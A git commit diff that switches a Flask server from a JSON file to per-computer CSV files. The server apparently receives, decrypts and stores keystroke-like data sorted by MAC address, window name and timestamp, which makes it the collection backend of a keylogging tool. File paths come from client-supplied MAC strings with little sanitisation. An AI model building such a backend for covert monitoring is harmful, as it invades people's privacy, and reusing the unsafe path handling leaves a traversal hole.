7aee92a3950458a6652d425977a2b84f332f9f46
eli <lykkh78@gmail.com>
2025-02-25 17:16:11 +0200

    שינוי server שה מסד נתונים שלו יעבוד עם קבצי csv

--- server/controllers.py
+++ server/controllers.py
@@ -1,10 +1,17 @@
+from os import environ
+
 from flask import send_from_directory , request,jsonify
 import sys
 import os
 from dotenv import load_dotenv
 import json
+import csv
+import pandas as pd
 
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
+
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+LOG_FOLDER = os.path.join(BASE_DIR, "computers")
 
 # Loading environment variables
 load_dotenv()
@@ -29,14 +36,6 @@ def _decrypt(encrypted_text: list) -> str:
         )
 
 # A function to load the data from the database
-def _load_data():
-    """
-    Returns all data found
-     in the database file
-    """
-    with open(file_name , 'r' , encoding= "utf-8") as file:
-        data = json.load(file)
-    return data
 
 
 # Function to return the main HTML page
@@ -46,20 +45,6 @@ def index_page():
     """
     return send_from_directory("../front", "index.html")
 
-# A function to return all data
-def get_data():
-    """
-    Returns all data after decoding
-    """
-    data = _load_data()
-    temp_dict = dict()
-    for mac, user_dict in data.items():
-        temp_dict[mac] = dict()
-        for window, data_dict in user_dict.items():
-            temp_dict[mac][window] = dict()
-            for timestamp, data_keys in data_dict.items():
-                temp_dict[mac][window][timestamp] = _decrypt(data_keys)
-    return jsonify(temp_dict)
 
 # A function to get all the computers
 def get_users():
@@ -67,11 +52,10 @@ def get_users():
     Returns all MAC addresses of
      the active computers
     """
-    data = _load_data()
-    if not data:  
-        return jsonify([])
-    users = list(data.keys())
-    return jsonify(users)
+    directory = './computers'
+    all_items = os.listdir(directory)
+    files = [str(f)[9:-4].replace('-',':') for f in all_items if os.path.isfile(os.path.join(directory, f))]
+    return jsonify(files)
 
 # A function to get information for a specific computer
 def get_data_by_mac(mac_address):
@@ -79,11 +63,15 @@ def get_data_by_mac(mac_address):
     Returns all data for a
      specific computer
     """
-    data = _load_data()
-    if mac_address in data:
-        return jsonify(_decrypt(data[mac_address]))
-    else:
-        return jsonify({"error": "MAC address not found"}), 404
+    corrct_mac_address = str(mac_address).replace(":", "-")
+    csv_file_path = f'./computers/computer_{corrct_mac_address}.csv'
+    try:
+        df = pd.read_csv(csv_file_path)
+        data_as_dict = df.to_dict(orient='records')
+        return jsonify(data_as_dict)
+    except FileNotFoundError:
+        return jsonify({'error': 'computer not found '})
+
 
 # Function to store data
 def store_data():
@@ -92,27 +80,23 @@ def store_data():
     the computers in a database file
     """
     data = request.get_json()
-    try:
-        with open(file_name, "r", encoding="utf-8") as file:
-            try:
-                origin_data = json.load(file)
-            except json.JSONDecodeError:
-                origin_data = dict()
-    except FileNotFoundError:
-        origin_data = dict()
     for mac in data:
-        if mac not in origin_data:
-            origin_data[mac] = dict()
-        for window in data[mac]:
-            if window not in origin_data[mac]:
-                origin_data[mac][window] = dict()
-            for timestamp in data[mac][window]:
-                if timestamp not in origin_data[mac][window]:
-                    origin_data[mac][window][timestamp] = list()
-                origin_data[mac][window][timestamp] += data[mac][window][timestamp]
+        sanitized_mac = mac.replace(":", "-")
+        csv_file_path = os.path.join(LOG_FOLDER, f"computer_{sanitized_mac}.csv")
+        file_exists = os.path.isfile(csv_file_path)
+        with open(csv_file_path, 'a', newline='', encoding='utf-8') as csvfile:
+            writer = csv.writer(csvfile)
+            if not file_exists:
+                writer.writerow(['MAC_address','window_mame','timestamp','data'])
+            flattened_data = [
+                [mac, window, timestamp, _decrypt(data_keys)]
+                for window, timestamps in data[mac].items()
+                for timestamp, data_keys in timestamps.items()
+            ]
+            writer.writerows(flattened_data)
 
-    with open(file_name, "w", encoding="utf-8") as file:
-        json.dump(origin_data, file, indent='\t', ensure_ascii=False)
+    return jsonify({"message": "Data stored successfully"})
+
 
 
 def handle_url_params():
